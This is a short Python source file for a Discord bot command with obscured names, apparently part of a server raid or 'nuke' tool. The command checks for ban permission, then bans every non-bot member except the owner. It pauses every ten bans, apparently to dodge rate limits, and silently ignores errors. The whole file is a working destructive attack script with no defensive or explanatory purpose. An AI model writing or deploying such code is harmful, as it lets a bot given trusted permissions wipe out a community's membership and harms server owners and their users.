import discord
import asyncio
from core.g._78 import _78

async def _6(ctx):
    if not ctx.guild.me.guild_permissions.ban_members:
        await ctx.send("BOT NEEDS BAN PERMISSION", delete_after=3)
        return
    await ctx.send("BANNING ALL MEMBERS", delete_after=2)
    members = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.owner]
    banned = 0
    for member in members:
        try:
            await member.ban(reason=_78.BAN_REASON)
            banned += 1
            if banned % 10 == 0:
                await asyncio.sleep(0.5)
        except:
            pass
    await ctx.send(f"BANNED {banned} MEMBERS")
